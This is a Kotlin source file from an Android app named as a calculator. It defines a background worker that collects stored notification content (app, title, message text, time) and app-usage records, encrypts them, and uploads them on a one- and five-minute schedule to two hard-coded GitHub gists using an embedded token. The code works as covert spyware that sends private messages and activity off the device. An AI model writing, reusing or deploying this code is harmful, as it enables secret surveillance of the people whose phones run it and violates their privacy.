package com.android.mycalculator

import android.content.Context
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class SyncWorker(context: Context, workerParams: WorkerParameters) : Worker(context, workerParams) {
    
    companion object {
        private const val GITHUB_TOKEN = BuildConfig.GITHUB_TOKEN
        
        // TWO SEPARATE GISTS
        private const val GIST_NOTIF_ID = "b529558252be113e01993f24429e8556" 
        private const val GIST_USAGE_ID = "55f3a178d45427d0f171da0a3266c18e"
    }

    override fun doWork(): Result {
        val dbHelper = DatabaseHelper(applicationContext)
        var notifSuccess = true
        var usageSuccess = true

        // ==========================================
        // CHANNEL 1: NOTIFICATION SYNC (Every 1 Min)
        // ==========================================
        val unsyncedNotifs = dbHelper.getUnsyncedLogs()
        if (unsyncedNotifs.isNotEmpty()) {
            notifSuccess = syncToGist(
                gistId = GIST_NOTIF_ID, 
                fileName = "notifications.csv", 
                header = "Device,App,Title,Content,Time\n", 
                logs = unsyncedNotifs, 
                dbHelper = dbHelper, 
                tableName = "logs"
            )
        }

        // ==========================================
        // CHANNEL 2: USAGE SYNC (Strict 5 Min Limit)
        // ==========================================
        val prefs = applicationContext.getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
        val lastUsageTime = prefs.getLong("last_usage_sync", 0)
        val currentTime = System.currentTimeMillis()

        // Only extract and upload if 5 full minutes (300,000 ms) have passed
        if (currentTime - lastUsageTime >= 5 * 60 * 1000) {
            UsageTracker.extractUsageEvents(applicationContext, dbHelper)
            val unsyncedUsage = dbHelper.getUnsyncedUsageLogs()
            
            if (unsyncedUsage.isNotEmpty()) {
                usageSuccess = syncToGist(
                    gistId = GIST_USAGE_ID, 
                    fileName = "usage_stats.csv", 
                    header = "Device,App Name,Date,Start Time,End Time\n", 
                    logs = unsyncedUsage, 
                    dbHelper = dbHelper, 
                    tableName = "usage_logs"
                )
                
                // If successful, reset the 5-minute timer
                if (usageSuccess) {
                    prefs.edit().putLong("last_usage_sync", System.currentTimeMillis()).apply()
                }
            }
        }

        // If either failed, tell Android to retry based on the backoff policy
        if (!notifSuccess || !usageSuccess) {
            return Result.retry()
        }

        return Result.success()
    }

    // ==========================================
    // REUSABLE UPLOAD ENGINE
    // ==========================================
    private fun syncToGist(gistId: String, fileName: String, header: String, logs: List<Pair<Int, String>>, dbHelper: DatabaseHelper, tableName: String): Boolean {
        try {
            // 1. GET CURRENT GIST DATA
            val getUrl = URL("https://api.github.com/gists/$gistId")
            val getConn = getUrl.openConnection() as HttpURLConnection
            getConn.connectTimeout = 15000; getConn.readTimeout = 15000
            getConn.requestMethod = "GET"
            getConn.setRequestProperty("Authorization", "Bearer $GITHUB_TOKEN")
            getConn.setRequestProperty("Accept", "application/vnd.github.v3+json")

            var currentContent = header

            if (getConn.responseCode == 200) {
                val responseStr = BufferedReader(InputStreamReader(getConn.inputStream)).use { it.readText() }
                val jsonResponse = JSONObject(responseStr)
                val files = jsonResponse.getJSONObject("files")
                
                if (files.has(fileName)) {
                    val rawData = files.getJSONObject(fileName).getString("content")
                    currentContent = if (rawData.startsWith("Device,")) rawData else EncryptionHelper.decrypt(rawData)
                    if (!currentContent.endsWith("\n")) currentContent += "\n"
                }
            }
            getConn.disconnect()

            if (currentContent.isEmpty()) currentContent = header

            // 2. APPEND NEW DATA
            val syncedIds = mutableListOf<Int>()
            for (log in logs) {
                currentContent += log.second 
                syncedIds.add(log.first)    
            }

            // 3. ENCRYPT
            val encryptedPayload = EncryptionHelper.encrypt(currentContent)

            // 4. UPLOAD
            val patchUrl = URL("https://api.github.com/gists/$gistId")
            val patchConn = patchUrl.openConnection() as HttpURLConnection
            patchConn.connectTimeout = 15000; patchConn.readTimeout = 15000
            patchConn.requestMethod = "PATCH"
            patchConn.setRequestProperty("Authorization", "Bearer $GITHUB_TOKEN")
            patchConn.setRequestProperty("Accept", "application/vnd.github.v3+json")
            patchConn.setRequestProperty("Content-Type", "application/json")
            patchConn.doOutput = true

            val fileObj = JSONObject().apply { put("content", encryptedPayload) }
            val filesObj = JSONObject().apply { put(fileName, fileObj) }
            val payloadObj = JSONObject().apply { put("files", filesObj) }

            OutputStreamWriter(patchConn.outputStream).use { writer ->
                writer.write(payloadObj.toString())
                writer.flush()
            }

            val responseCode = patchConn.responseCode
            patchConn.disconnect()

            // 5. CLEANUP
            if (responseCode == 200) {
                dbHelper.markAsSynced(syncedIds, tableName)
                dbHelper.deleteOldSyncedLogs()
                return true
            } else {
                Log.e("SyncWorker", "GitHub API Error Code: $responseCode for $fileName")
                return false
            }

        } catch (e: Exception) {
            e.printStackTrace()
            return false
        }
    }
}
